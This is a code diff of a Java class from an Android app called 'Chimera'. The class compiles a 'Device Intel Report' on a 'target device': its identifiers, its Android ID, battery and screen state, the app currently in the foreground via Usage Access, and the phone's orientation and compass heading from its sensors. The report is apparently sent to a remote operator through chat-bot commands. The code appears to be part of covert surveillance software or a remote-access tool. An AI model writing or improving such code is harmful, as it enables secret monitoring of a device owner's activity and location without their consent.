@@ -38,23 +38,20 @@ public class DeviceDetailsHelper {
     }
 
     public static void getDeviceDetails(Context context, DetailsCallback callback) {
-        StringBuilder details = new StringBuilder();
+        if (!hasUsageStatsPermission(context)) {
+            String permissionMessage = "Foreground App detection requires the 'Usage Access' permission.\n\nPlease run the `/grant_usage_access` command to open the required settings page on the target device and enable the permission for this app.";
+            callback.onDetailsReady(permissionMessage);
+            return;
+        }
 
+        StringBuilder details = new StringBuilder();
         details.append("`Chimera Device Intel Report`\n");
         details.append("`====================`\n\n");
-
         details.append("*--- Device Info ---*\n");
         details.append("`Manufacturer:` ").append(Build.MANUFACTURER).append("\n");
         details.append("`Model:       ` ").append(Build.MODEL).append("\n");
-        details.append("`Brand:       ` ").append(Build.BRAND).append("\n");
         details.append("`Android Ver: ` ").append(Build.VERSION.RELEASE).append(" (SDK ").append(Build.VERSION.SDK_INT).append(")\n");
-        details.append("`Android ID:  ` ").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)).append("\n");
-
-        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
-        DisplayMetrics metrics = new DisplayMetrics();
-        wm.getDefaultDisplay().getRealMetrics(metrics);
-        details.append("`Screen:      ` ").append(metrics.heightPixels).append("x").append(metrics.widthPixels).append(" (").append(metrics.densityDpi).append(" dpi)\n\n");
-
+        details.append("`Android ID:  ` ").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)).append("\n\n");
         details.append("*--- Status ---*\n");
         details.append(getBatteryInfo(context));
         details.append(getScreenState(context));
@@ -80,20 +77,12 @@ public class DeviceDetailsHelper {
         int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
         int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
         int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
-        int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
         float batteryPct = level * 100 / (float) scale;
         String statusStr = "Unknown";
         if (status == BatteryManager.BATTERY_STATUS_CHARGING) statusStr = "Charging";
         if (status == BatteryManager.BATTERY_STATUS_DISCHARGING) statusStr = "Discharging";
         if (status == BatteryManager.BATTERY_STATUS_FULL) statusStr = "Full";
-        if (status == BatteryManager.BATTERY_STATUS_NOT_CHARGING) statusStr = "Not Charging";
-        String chargeSource = "";
-        if (status == BatteryManager.BATTERY_STATUS_CHARGING) {
-            if (chargePlug == BatteryManager.BATTERY_PLUGGED_USB) chargeSource = " (USB)";
-            if (chargePlug == BatteryManager.BATTERY_PLUGGED_AC) chargeSource = " (AC)";
-            if (chargePlug == BatteryManager.BATTERY_PLUGGED_WIRELESS) chargeSource = " (Wireless)";
-        }
-        return "`Battery:     ` " + (int) batteryPct + "% (" + statusStr + chargeSource + ")\n";
+        return "`Battery:     ` " + (int) batteryPct + "% (" + statusStr + ")\n";
     }
 
     private static String getScreenState(Context context) {
@@ -114,14 +103,11 @@ public class DeviceDetailsHelper {
     }
 
     private static String getForegroundApp(Context context) {
-        if (!hasUsageStatsPermission(context)) {
-            return "`Foreground App: ` Permission Not Granted (Usage Access)";
-        }
         String currentApp = "Not Available";
         UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
         long time = System.currentTimeMillis();
         List<UsageStats> appList = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 1000, time);
-        if (appList != null && appList.size() > 0) {
+        if (appList != null && !appList.isEmpty()) {
             SortedMap<Long, UsageStats> mySortedMap = new TreeMap<>();
             for (UsageStats usageStats : appList) {
                 mySortedMap.put(usageStats.getLastTimeUsed(), usageStats);
@@ -158,32 +144,25 @@ public class DeviceDetailsHelper {
         SensorManager sensorManager = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);
         Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
         Sensor magnetometer = sensorManager.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD);
-        Sensor proximity = sensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY);
         StringBuilder sensorAnalysis = new StringBuilder();
         sensorAnalysis.append("*--- Sensor Analysis ---*\n");
-        if (accelerometer == null && magnetometer == null) {
-            sensorAnalysis.append("Orientation/Position sensors not available.\n");
+        if (accelerometer == null || magnetometer == null) {
+            sensorAnalysis.append("Orientation sensors not available.\n");
             callback.onDetailsReady(sensorAnalysis.toString());
             return;
         }
-        final float[][] sensorData = new float[3][];
+        final float[][] sensorData = new float[2][];
         SensorEventListener listener = new SensorEventListener() {
             @Override public void onSensorChanged(SensorEvent event) {
                 if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) sensorData[0] = event.values.clone();
                 if (event.sensor.getType() == Sensor.TYPE_MAGNETIC_FIELD) sensorData[1] = event.values.clone();
-                if (event.sensor.getType() == Sensor.TYPE_PROXIMITY) sensorData[2] = event.values.clone();
             }
-            @Override public void onAccuracyChanged(Sensor sensor, int accuracy) {}
+            @Override public void onAccuracyChanged(Sensor s, int a) {}
         };
         sensorManager.registerListener(listener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
         sensorManager.registerListener(listener, magnetometer, SensorManager.SENSOR_DELAY_NORMAL);
-        sensorManager.registerListener(listener, proximity, SensorManager.SENSOR_DELAY_NORMAL);
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             sensorManager.unregisterListener(listener);
-            if (sensorData[2] != null) {
-                sensorAnalysis.append("`Proximity: ` ").append(sensorData[2][0]).append(" cm\n");
-                if (sensorData[2][0] < 1) sensorAnalysis.append("`Analysis:  ` In pocket or on call.\n");
-            }
             if (sensorData[0] != null) {
                 float x = sensorData[0][0], y = sensorData[0][1], z = sensorData[0][2];
                 if (Math.abs(z) > 8.5) sensorAnalysis.append("`Position:  ` Lying flat, screen ").append(z > 0 ? "UP." : "DOWN.").append("\n");
@@ -199,12 +178,11 @@ public class DeviceDetailsHelper {
                     float azimuth = (float) Math.toDegrees(orientation[0]);
                     if (azimuth < 0) azimuth += 360;
                     String direction = "N";
-                    if (azimuth >= 337.5 || azimuth < 22.5) direction = "North";
-                    else if (azimuth < 67.5) direction = "North-East"; else if (azimuth < 112.5) direction = "East";
-                    else if (azimuth < 157.5) direction = "South-East"; else if (azimuth < 202.5) direction = "South";
-                    else if (azimuth < 247.5) direction = "South-West"; else if (azimuth < 292.5) direction = "West";
-                    else if (azimuth < 337.5) direction = "North-West";
-                    sensorAnalysis.append("`Direction: ` Pointing ").append(direction).append(" (").append((int)azimuth).append("°).\n");
+                    if (azimuth >= 337.5 || azimuth < 22.5) direction = "North"; else if (azimuth < 67.5) direction = "NE";
+                    else if (azimuth < 112.5) direction = "East"; else if (azimuth < 157.5) direction = "SE";
+                    else if (azimuth < 202.5) direction = "South"; else if (azimuth < 247.5) direction = "SW";
+                    else if (azimuth < 292.5) direction = "West"; else if (azimuth < 337.5) direction = "NW";
+                    sensorAnalysis.append("`Direction: ` Top of device pointing ").append(direction).append(" (").append((int)azimuth).append("°).\n");
                 }
             }
             callback.onDetailsReady(sensorAnalysis.toString());
